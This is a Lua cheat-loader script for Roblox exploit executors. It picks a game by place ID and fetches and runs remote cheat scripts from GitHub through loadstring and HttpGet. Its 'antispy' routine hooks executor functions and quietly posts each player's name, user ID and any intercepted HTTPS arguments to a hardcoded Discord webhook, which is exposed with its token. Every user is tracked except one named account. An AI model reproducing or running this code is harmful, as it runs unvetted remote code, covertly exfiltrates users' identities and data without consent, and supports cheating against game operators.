--[[
https://www.roblox.com/games/13885546444/UPD-Simulator-Memotong?gameSetTypeId=100000003&homePageSessionInfo=1ba2bc90-a50a-4bb1-8b53-63b09de00389&isAd=false&numberOfLoadedTiles=50&page=sortDetailPageHome&placeId=13885546444&position=6&universeId=4813626669
https://www.roblox.com/games/14822302723/Gun-Ball?gameSetTypeId=100000003&homePageSessionInfo=1ba2bc90-a50a-4bb1-8b53-63b09de00389&isAd=false&numberOfLoadedTiles=50&page=sortDetailPageHome&placeId=14822302723&position=17&universeId=5107841430
https://www.roblox.com/games/12135640403/SOLO-LEVELING-Anime-Dungeon-Fighters?gameSetTypeId=100000003&homePageSessionInfo=1ba2bc90-a50a-4bb1-8b53-63b09de00389&isAd=false&numberOfLoadedTiles=50&page=sortDetailPageHome&placeId=12135640403&position=1&universeId=4280744785
https://www.roblox.com/games/15300789066/Shoot-Beam-Simulator?gameSetTypeId=100000003&homePageSessionInfo=1ba2bc90-a50a-4bb1-8b53-63b09de00389&isAd=false&numberOfLoadedTiles=50&page=sortDetailPageHome&placeId=15300789066&position=27&universeId=5277069600
https://www.roblox.com/games/14897405913/DUNIA-5-Simulator-Lumberjack?gameSetTypeId=100000003&homePageSessionInfo=1ba2bc90-a50a-4bb1-8b53-63b09de00389&isAd=false&numberOfLoadedTiles=50&page=sortDetailPageHome&placeId=14897405913&position=25&universeId=5132598287
https://www.roblox.com/games/8880590553/Simulator-Evolusi-Hewan?gameSetTypeId=100000003&homePageSessionInfo=1ba2bc90-a50a-4bb1-8b53-63b09de00389&isAd=false&numberOfLoadedTiles=50&page=sortDetailPageHome&placeId=8880590553&position=3&universeId=3358419523
https://www.roblox.com/games/14841485778/Possessor?gameSetTypeId=100000003&homePageSessionInfo=adeab86f-ae3c-40bc-8414-dc3b949b6dab&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=14841485778&position=0&sortPos=0&universeId=5114123816
https://www.roblox.com/games/15935482021/UPD7-Simulator-Infinity-Anime-Gratis?gameSetTypeId=100000003&homePageSessionInfo=bb1bc90e-af73-42cb-900f-2373b367a391&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=15935482021&position=0&sortPos=0&universeId=5510084750
https://www.roblox.com/games/1240123653/Zombie-Serangan?gameSearchSessionInfo=18b9355b-0fbd-42f0-bf04-8d8c638e9e9d&isAd=false&nativeAdData=&numberOfLoadedTiles=40&page=searchPage&placeId=1240123653&position=0&universeId=504035427
https://www.roblox.com/games/4972091010/BARU-Pemberontakan-Zombie?gameSearchSessionInfo=bd8ab1bd-27a2-4f0e-847d-f622377e345b&isAd=false&nativeAdData=&numberOfLoadedTiles=40&page=searchPage&placeId=4972091010&position=0&universeId=1709832923
https://www.roblox.com/games/12152063271/BARU-Simulator-Pukulan-Bola-Api?gameSetTypeId=100000003&homePageSessionInfo=a6316aa5-e207-4259-b1a8-ccc66946259d&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=12152063271&position=0&sortPos=0&universeId=4285834347
https://www.roblox.com/games/14168050172/Simulator-Gauntlet?gameSetTypeId=100000003&homePageSessionInfo=7d1834d6-9512-4dbc-ad60-c6386c262834&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=14168050172&position=0&sortPos=0&universeId=4903983422
https://www.roblox.com/games/15840422464/Simulator-StarRail-RELEASE?gameSetTypeId=100000003&homePageSessionInfo=a6ad7b5a-36ad-4c2b-a2ca-9525068934d0&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=15840422464&position=0&sortPos=0&universeId=5477548919
https://www.roblox.com/games/15445888182/PLAZA-Pet-Adventures-Simulator?gameSetTypeId=100000003&homePageSessionInfo=b16e6fda-ff25-4bc9-9fe7-30c49f961102&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=15445888182&position=0&sortPos=0&universeId=5329466173
https://www.roblox.com/games/16230991879/NEW-Simulator-Pengkodean?gameSetTypeId=100000003&homePageSessionInfo=487e3a71-cb2b-49ab-adc8-93ce96ebda94&isAd=false&numberOfLoadedTiles=6&page=homePage&placeId=16230991879&position=1&sortPos=0&universeId=5602610435
]]

local http = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
local HttpService = game:GetService("HttpService")
local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
local user = game:GetService("Players").LocalPlayer
local workspace = game:GetService("Workspace")
local expfunctions = {
    writefile,
    print,
    rconsoleerr,
    rconsolewarn,
    warn,
    error,
    isfile,
    readfile,
    game.HttpGet,
    user.Kick,
    http
}

local function SendMessage(url,message)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = HttpService:JSONEncode(data)
    local response = http({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local varlog = ""
local function antispy()
for ind,var in next,expfunctions do
    local old = hookfunction(var,newcclosure(function(...)
                local args = {...}
                for i,v in next,args do
                    if tostring(i):find("https") or tostring(v):find("https") then
			varlog = varlog .. "\n" .. i .. ". " .. v
                        SendMessage(conflog,"Spying " .. user.DisplayName .. " ( " .. user.Name .. " ) ( " .. user.UserId .. " ) | Vanguard HTTPS Protection\n```\n" .. varlog .. "\n```")
		    elseif tostring(i):find("Kick") or tostring(v):find("Kick") or getnamecallmethod() == "Kick" then
			varlog = varlog .. "\nSuccessfully bypassed kick method! ( Server-side & Client-side )"
			SendMessage(conflog,"Spying " .. user.DisplayName .. " ( " .. user.Name .. " ) ( " .. user.UserId .. " ) | Vanguard Kick Detection\n```\n" .. varlog .. "\n```")
		    else
			varlog = varlog .. "\n" .. i .. ". " .. v
		        SendMessage(conflog,"Spying " .. user.DisplayName .. " ( " .. user.Name .. " ) ( " .. user.UserId .. " ) | Vanguard Client Detection\n```\n" .. varlog .. "\n```")
			task.spawn(function()
				local msg = Instance.new("Message",workspace)
				msg.Text = "Text: " .. v .. " (" .. i .. ")\nMethod: null"
				wait(5)
				msg:Destroy()
			end)
                    end
                end
                return old(...)
            end))
end
end

if game.PlaceId == 13885546444 then -- mowing simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Mowing-Simulator/main/.lua"))()
elseif game.PlaceId == 14822302723 then -- gun ball
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Gun-Ball/main/.lua"))()
elseif game.PlaceId == 12135640403 or game.PlaceId == 15502802094 or game.PlaceId == 15742087191 then -- Anime Dungeon Fighters world 1 & 2
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Anime-Dungeon-Fighters/main/.lua"))()
elseif game.PlaceId == 15300789066 then -- shoot beam simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Shoot-Beam-Simulator/main/.lua"))()
elseif game.PlaceId == 14897405913 then -- lumberjack simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Lumberjack-Simulator/main/.lua"))()
elseif game.PlaceId == 8880590553 then -- Animal Evolution Simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Animal-Evolution-Simulator/main/.lua"))()
elseif game.PlaceId == 14841485778 then -- possessor
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Possessor/main/.lua"))()
elseif game.PlaceId == 15935482021 then -- Anime Infinity Simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Anime-Infinity/main/.lua"))()
elseif game.PlaceId == 1240123653 then -- Zombie Attack
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Secure/Zombie-Attack/main/.lua"))()
elseif game.PlaceId == 14834754084 then -- Special Forces Simulator (PVP Mode)
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Special-Forces-Simulator/main/.lua"))()
elseif game.PlaceId == 4972091010 then -- Zombie Uprising
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/TurtleHub/main/Zombie-Uprising/Script.lua"))()
elseif game.PlaceId == 12152063271 then -- fire ball punch
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/FireballPunchSimulator/main/.lua"))()
elseif game.PlaceId == 14168050172 then -- Gauntlet Simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Gauntlet-Simulator/main/.lua"))()
elseif game.PlaceId == 15840422464 then -- StarRail Simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/StarRail-Simulator/main/.lua"))()
elseif game.PlaceId == 15445888182 then -- Pet Adventures Simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Pet-Adventure-Simulator/main/.lua"))()
elseif game.PlaceId == 16230991879 then -- Coding Simulator
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Sidhsksjsjsh/Soding-Simulator/main/.lua"))()
else
  local hin = Instance.new("Hint",game:GetService("Workspace"))
  hin.Text = "Unsupported games"
end
wait(0.5)
if user.Name ~= "Rivanda_Cheater" then
	antispy()
end
